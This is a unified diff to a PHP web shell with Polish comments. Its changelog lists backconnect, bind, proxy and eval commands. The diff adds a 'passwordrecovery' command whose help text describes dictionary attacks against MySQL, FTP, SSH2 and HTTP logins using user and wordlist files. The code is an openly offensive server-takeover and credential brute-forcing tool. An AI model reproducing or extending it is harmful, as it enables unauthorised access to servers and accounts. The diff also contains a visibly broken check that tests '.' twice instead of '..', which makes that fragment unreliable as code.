@@ -12,6 +12,7 @@ require_once dirname( __FILE__ ) . '/Lib/Request.php';
 require_once dirname( __FILE__ ) . '/Lib/Form.php';
 require_once dirname( __FILE__ ) . '/Lib/Html.php';
 require_once dirname( __FILE__ ) . '/Lib/MysqlDumper.php';
+require_once dirname( __FILE__ ) . '/Lib/PasswordRecovery.php';
 
 /**
  * class Shell - Zarzadzanie serwerem ;)
@@ -31,7 +32,7 @@ class Shell
 	/**
 	 * Wersja
 	 */
-	const VERSION = '0.2 b110531';
+	const VERSION = '0.2 b110601';
 
 	/**
 	 * Czas generowania strony
@@ -631,12 +632,20 @@ HELP;
 		{
 			try
 			{
-				$oDirectory = new RecursiveIteratorIterator( new RecursiveDirectoryIterator( $this -> sArgv, RecursiveDirectoryIterator::SKIP_DOTS ), RecursiveIteratorIterator::CHILD_FIRST );
+				$oDirectory = new RecursiveIteratorIterator( new RecursiveDirectoryIterator( $this -> sArgv ), RecursiveIteratorIterator::CHILD_FIRST );
 
 				foreach( $oDirectory as $oFile )
 				{
 					if( $oFile -> isDir() )
 					{
+						/**
+						 * PHP 5.2.X nie posiada stalej RecursiveDirectoryIterator::SKIP_DOTS
+						 */
+						if( ( $oFile -> getBasename() === '.' ) || ( $oFile -> getBasename() === '.' ) )
+						{
+							continue;
+						}
+
 						/**
 						 * Usuwanie katalogu
 						 */
@@ -656,6 +665,8 @@ HELP;
 						}
 					}
 				}
+
+				$oDirectory = NULL;
 
 				/**
 				 * Usuwanie ostatniego katalogu
@@ -1701,6 +1712,62 @@ HELP;
 	}
 
 	/**
+	 * Komenda - passwordrecovery
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandPasswordRecovery()
+	{
+		/**
+		 * Help
+		 */
+		if( ( $this -> iArgc !== 4 ) || ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<HELP
+passwordrecovery, pr - Odzyskiwanie haseł, atak słownikowy na mysql, ftp, ssh2 oraz http
+
+	Typ:
+		mysql
+		ftp
+		ssh2
+		http
+
+	Użycie:
+		passwordrecovery typ host:port uzytkownik|plik_z_uzytkownikami slownik
+		passwordrecovery typ http://localhost/auth/ uzytkownik|plik_z_uzytkownikami slownik
+
+	Przykład:
+
+		passwordrecovery http http://localhost/auth/ tester /tmp/dic
+		passwordrecovery mysql localhost:3306 tester /tmp/dic
+HELP;
+		}
+
+		try
+		{
+			ob_start();
+
+			header( 'Content-Type: text/plain; charset=utf-8', TRUE );
+
+			$oPasswordRecovery = new PasswordRecovery();
+			$oPasswordRecovery -> setHost( $this -> aArgv[1] )
+					   -> setType( $this -> aArgv[0] )
+					   -> setUsers( $this -> aArgv[2] )
+					   -> setPasswords( $this -> aArgv[3] )
+					   -> get();
+			ob_end_flush();
+			exit ;
+
+		}
+		catch( PasswordRecoveryException $oException )
+		{
+			header( 'Content-Type: text/html; charset=utf-8', TRUE );
+			return $oException;
+		}
+	}
+
+	/**
 	 * Komenda - proxy
 	 *
 	 * @access private
@@ -1727,7 +1794,7 @@ proxy - Proxy HTTP
 	Blokada jest zwolniona po tym jak użytkownik przerwie lub ściągnie plik
 	Proxy te nie sluży do przeglądania youtuba, a wyłacznie do pobieranie małych plików tekstowych
 
-	Aby zatrzymać serwer nalezy wyslac do niego polecenie ":exit"
+	Aby zatrzymać serwer nalezy wyslac do niego polecenie ':exit' lub odwiedzić hosta 'command.exit'
 
 	Użycie:
 		proxy [opcja] port
@@ -1794,7 +1861,7 @@ HELP;
 
 		ob_start();
 
-		header( 'Content-Type: text/plain', TRUE );
+		header( 'Content-Type: text/plain; charset=utf-8', TRUE );
 
 		echo "Proxy zostało uruchomione\n\n";
 
@@ -2005,7 +2072,9 @@ HELP;
 		 * Zamykanie socketa (chyba a raczej na pewno sie nigdy nie zamknie)
 		 */
 		socket_close( $rSock );
+
 		ob_end_flush();
+
 		exit ;
 	}
 
@@ -2028,7 +2097,7 @@ btw, sprawdziłeś komendę: '<strong>:g4m3</strong>'?
 
 Changelog:
 
-2011-05-31 v0.2
+2011-06-01 v0.2
 ----------
 * Wsparcie dla CLI
 * Shella rozszerzono o następujące komendy:
@@ -2042,6 +2111,7 @@ Changelog:
 	<strong>backconnect</strong>
 	<strong>bind</strong>
 	<strong>proxy</strong>
+	<strong>passwordrecovery</strong>
 	<strong>cr3d1ts</strong>
 * polecenie <strong>g4m3</strong> oraz <strong>cr3d1ts</strong> nie wyświetlają się w help'ie (&#069;&#097;&#115;&#116;&#101;&#114;&#032;&#101;&#103;&#103;)
 * <strong>php</strong> jest aliasem dla <strong>eval</strong>
@@ -2337,6 +2407,7 @@ HELP;
 				 */
 				case $this -> sPhpInfo:
 					$sConsole = $this -> getCommandPhpInfo();
+					break ;
 				case 'socketdownload':
 				case 'socketdown':
 				case 'socketget':
@@ -2383,6 +2454,10 @@ HELP;
 					break ;
 				case 'proxy':
 					$sConsole = $this -> getCommandProxy();
+					break ;
+				case 'passwordrecovery':
+				case 'pr':
+					$sConsole = $this -> getCommandPasswordRecovery();
 					break ;
 				case 'cr3d1ts':
 					$sConsole = $this -> getCommandCr3d1ts();
@@ -2523,7 +2598,7 @@ CONTENT;
 	{
 		$sData = $this -> getActionBrowser();
 
-		return $sData;
+		echo $sData;
 
 	}
 
@@ -2562,6 +2637,6 @@ for( $i = 0; $i < ob_get_level(); $i++ )
 }
 
 $oShell = new Shell();
-echo $oShell -> get();
+$oShell -> get();
 
 exit ;
